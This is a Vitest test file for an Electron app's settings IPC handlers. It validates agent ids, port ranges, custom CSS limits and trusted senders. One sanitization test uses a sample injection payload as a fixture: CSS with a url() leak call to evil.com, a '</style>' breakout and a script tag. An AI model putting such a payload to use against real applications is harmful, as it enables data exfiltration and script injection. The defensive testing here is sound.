// SPDX-License-Identifier: MPL-2.0

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { setupElectronMock } from '../../../fixtures/mocks/electron';
import { getMainMessages } from '../../shared/i18n';
import { IpcChannel } from '../../shared/ipc-channels';
import type { MainContext } from '../main-context';
import { notifyStatusChanged } from '../main-context';

// ---------------------------------------------------------------------------
// Mocks
// ---------------------------------------------------------------------------

// Must declare before setupElectronMock() because vi.mock is hoisted.
let handlers: Map<string, (...args: unknown[]) => unknown>;

({ handlers } = setupElectronMock());

vi.mock('../main-context', () => ({
  settingsDto: vi.fn(() => ({
    apps: {},
    defaultPorts: {},
    wallpaper: { enabled: false, id: null, agents: {} },
  })),
  notifyStatusChanged: vi.fn(),
}));

const { registerSettingsIpc } = await import('./settings-ipc');
const { setTrustedSenderId } = await import('./trusted-sender');

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

function makeMockDeps(): MainContext {
  return {
    mainWindow: null,
    tray: null,
    isQuitting: false,
    locale: 'zh-CN',
    userDataRoot: '/tmp/test',
    settings: {
      setAppPath: vi.fn().mockResolvedValue(undefined),
      setAppPort: vi.fn().mockResolvedValue(undefined),
      setCustomThemeCss: vi.fn().mockResolvedValue(undefined),
    },
    core: {
      status: vi.fn().mockResolvedValue({ apps: [], platform: 'win32' }),
    },
  } as unknown as MainContext;
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

let mockDeps: MainContext;

describe('settings-ipc parameter validation', () => {
  beforeEach(() => {
    handlers.clear();
    vi.clearAllMocks();
    setTrustedSenderId(1);
    mockDeps = makeMockDeps();
    registerSettingsIpc(mockDeps);
  });

  describe('SETTINGS_PICK_APP_PATH', () => {
    it('rejects invalid agent id', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_PICK_APP_PATH)!;
      await expect(handler({}, 'unknown')).rejects.toThrow(getMainMessages().invalidAgentId);
      await expect(handler({}, 123)).rejects.toThrow(getMainMessages().invalidAgentId);
      await expect(handler({}, null)).rejects.toThrow(getMainMessages().invalidAgentId);
    });
  });

  describe('SETTINGS_CLEAR_APP_PATH', () => {
    it('rejects invalid agent id', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_CLEAR_APP_PATH)!;
      await expect(handler({}, 'unknown')).rejects.toThrow(getMainMessages().invalidAgentId);
      await expect(handler({}, 123)).rejects.toThrow(getMainMessages().invalidAgentId);
      await expect(handler({}, null)).rejects.toThrow(getMainMessages().invalidAgentId);
    });
  });

  describe('SETTINGS_SET_APP_PORT', () => {
    it('rejects invalid agent id', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_APP_PORT)!;
      await expect(handler({}, 'unknown', 8080)).rejects.toThrow(getMainMessages().invalidAgentId);
      await expect(handler({}, 123, 8080)).rejects.toThrow(getMainMessages().invalidAgentId);
      await expect(handler({}, null, 8080)).rejects.toThrow(getMainMessages().invalidAgentId);
    });

    it('rejects port below 1024', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_APP_PORT)!;
      await expect(handler({}, 'workbuddy', 0)).rejects.toThrow(getMainMessages().invalidPort);
      await expect(handler({}, 'workbuddy', 80)).rejects.toThrow(getMainMessages().invalidPort);
      await expect(handler({}, 'workbuddy', 1023)).rejects.toThrow(getMainMessages().invalidPort);
    });

    it('rejects port above 65535', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_APP_PORT)!;
      await expect(handler({}, 'workbuddy', 65536)).rejects.toThrow(getMainMessages().invalidPort);
      await expect(handler({}, 'workbuddy', 100000)).rejects.toThrow(getMainMessages().invalidPort);
    });

    it('rejects non-integer port', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_APP_PORT)!;
      await expect(handler({}, 'workbuddy', 8080.5)).rejects.toThrow(getMainMessages().invalidPort);
      await expect(handler({}, 'workbuddy', NaN)).rejects.toThrow(getMainMessages().invalidPort);
    });

    it('rejects non-number port (string, object)', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_APP_PORT)!;
      await expect(handler({}, 'workbuddy', '8080')).rejects.toThrow(getMainMessages().invalidPort);
      await expect(handler({}, 'workbuddy', {})).rejects.toThrow(getMainMessages().invalidPort);
    });

    it('accepts null as port (clears override)', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_APP_PORT)!;
      await expect(handler({}, 'workbuddy', null)).resolves.toBeDefined();
      expect(vi.mocked(mockDeps.settings.setAppPort)).toHaveBeenCalledWith('workbuddy', null);
      expect(notifyStatusChanged).toHaveBeenCalled();
    });
  });

  describe('SETTINGS_SET_CUSTOM_CSS', () => {
    const trustedEvent = { sender: { id: 1 }, senderFrame: { isMainFrame: () => true } };

    it('rejects non-string input', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
      await expect(handler(trustedEvent, { not: 'css' })).rejects.toThrow(
        getMainMessages().invalidCustomCss,
      );
      expect(mockDeps.settings.setCustomThemeCss).not.toHaveBeenCalled();
    });

    it('rejects input over the 256KB limit', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
      await expect(handler(trustedEvent, 'x'.repeat(256 * 1024 + 1))).rejects.toThrow(
        getMainMessages().invalidCustomCss,
      );
      expect(mockDeps.settings.setCustomThemeCss).not.toHaveBeenCalled();
    });

    it('sanitizes a malicious payload before persisting (C2)', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
      const malicious =
        'body{background:url(https://evil.com/?leak=1)}</style><script>alert(1)</script>';
      await handler(trustedEvent, malicious);
      const persisted = vi.mocked(mockDeps.settings.setCustomThemeCss).mock.lastCall?.[0] as string;
      // The `</style>` breakout and the script tag must be gone.
      expect(persisted).not.toContain('</style>');
      expect(persisted).not.toContain('<script');
      // The remote url() resource MUST NOT survive sanitization.
      expect(persisted).not.toContain('url(https://evil.com');
    });

    it('persists clean CSS unchanged', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
      const safe = 'body { color: #fff; background: #222; }';
      await handler(trustedEvent, safe);
      expect(vi.mocked(mockDeps.settings.setCustomThemeCss)).toHaveBeenCalledWith(safe);
    });

    it('rejects calls from an untrusted sender (G5)', async () => {
      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
      await expect(handler({ sender: { id: 999 } }, 'body{}')).rejects.toThrow(
        'Untrusted IPC sender',
      );
      expect(mockDeps.settings.setCustomThemeCss).not.toHaveBeenCalled();
    });
  });
});
